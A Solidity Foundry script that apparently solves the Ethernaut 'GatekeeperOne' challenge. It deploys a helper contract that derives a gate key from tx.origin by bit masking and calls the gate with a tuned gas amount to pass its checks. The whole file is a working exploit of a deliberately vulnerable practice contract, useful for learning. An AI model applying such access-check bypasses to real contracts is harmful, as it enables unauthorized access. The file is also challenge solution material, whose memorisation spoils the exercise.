// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "src/GatekeeperOne.sol";

contract Brute {
    GatekeeperOne gate = GatekeeperOne(0x34b7Ca25810Bca22CE934e9A86D02c6aBEBE387A) ;

    uint16 b  = uint16(uint160(tx.origin));
    uint64 c = uint64(1 << 63) + uint64(b);

    bytes8 gateKey = bytes8(c);

    // a = uint64(_gateKey);
    // uint32(a) == uint16(uint160(tx.origin))
    // uint32(a) == uint16 b
    // uint32(a) != a
    // uint32(a) == uint16(uint160(tx.origin))

    constructor(GatekeeperOne _gate) {
        gate = _gate;
    }

    function callGatekeeperOne(uint256 _offset) external {

        gate.enter{gas: 8191 * 10 + _offset}(gateKey);
    }
}

contract Solve is Script {
    Brute brute;
    address instanceAddr = 0x34b7Ca25810Bca22CE934e9A86D02c6aBEBE387A;

    function run() external {

        vm.startBroadcast();
        brute = new Brute(GatekeeperOne(0x34b7Ca25810Bca22CE934e9A86D02c6aBEBE387A));
        brute.callGatekeeperOne(256);
        vm.stopBroadcast();
    }
}
